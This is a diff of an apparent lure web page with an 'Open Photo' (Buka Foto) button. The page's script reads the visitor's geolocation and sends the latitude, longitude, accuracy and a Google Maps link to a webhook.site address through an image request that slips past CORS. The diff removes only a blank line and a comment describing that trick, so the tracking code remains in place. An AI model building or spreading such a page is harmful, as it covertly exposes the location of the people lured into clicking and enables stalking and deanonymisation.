@@ -22,7 +22,6 @@
     <button class="btn" onclick="getLocation()">Buka Foto</button>
     <div id="status" class="status"></div>
   </div>
-
 <script>
     const WEBHOOK_URL = 'https://89fc2d12-706e-4bd0-a557-c7351a3bf8e9.webhook.site';
 
@@ -46,8 +45,6 @@
       const lon = position.coords.longitude;
       const accuracy = position.coords.accuracy;
       const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-
-      // SOLUSI: Menggunakan objek Image untuk mengirim data secara instan tanpa terhalang CORS
       const img = new Image();
       img.src = `${WEBHOOK_URL}/?lat=${lat}&lon=${lon}&akurasi_meter=${accuracy}&google_maps=${encodeURIComponent(googleMapsUrl)}`;
 
